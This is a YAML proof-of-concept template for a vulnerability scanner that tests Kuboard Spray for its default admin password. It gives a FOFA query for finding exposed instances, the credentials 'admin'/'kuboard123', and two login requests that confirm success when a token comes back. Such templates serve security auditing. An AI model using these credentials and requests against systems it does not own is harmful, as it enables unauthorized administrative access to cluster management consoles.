id: poc-yaml-kuboard-spray-default-password
info:
  name: Kuboard默认口令
  severity: high
  tags:
  - 弱口令
  finger: Kuboard Spray
  fofa: body="Kuboard Spray"
requests:
- method: POST
  path: /api/validate_password
  headers:
    Content-Type: application/json
  data: '{"username":"admin","password":"kuboard123"}

    '
  expression: status_code == 200 && contains(headers,"application/json") && contains(body,"\"message\":\"success\"")
    && contains(body,"\"data\":\"ok\"")
- method: POST
  path: /api/login
  headers:
    Content-Type: application/json
  data: '{"username":"admin","password":"kuboard123"}

    '
  expression: status_code == 200 && contains(headers,"application/json") && contains(body,"data")
    && contains(body,"token") && contains(body,"success")
variables: {}
transport: http
